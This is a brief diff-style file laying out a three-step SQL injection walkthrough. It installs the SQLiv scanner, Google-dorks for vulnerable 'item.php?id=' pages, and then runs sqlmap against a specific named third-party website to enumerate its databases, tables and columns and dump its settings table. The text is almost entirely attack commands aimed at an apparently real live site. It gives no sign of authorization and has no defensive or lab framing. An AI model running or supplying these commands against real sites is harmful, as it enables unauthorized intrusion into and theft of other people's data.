@@ -1,0 +1,19 @@
+STEP 1 : INSTALL SQLiv on KALI LINUX
+~# git clone https://github.com/Hadesy2k/sqliv.git
+~# cd sqliv &amp;&amp; sudo python2 setup.py -i
+
+STEP 2 : FINDING SQL INJECTION VULNERABILITIES
+~# sqliv -d inurl:item.php?id= -e google -p 100
+
+STEP 3 : SQL INJECTION USING SQLMAP
+ENUMERATE DATABASE NAME:
+~# sqlmap -u “http://www.acfurniture.com/item.php?id=25” --dbs
+
+ ENUMERATE TABLES NAME
+~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture --tables
+
+ENUMERATE COLUMNS
+~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture -T settings --columns
+
+ DUMP DATA
+~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture -T settings --dump
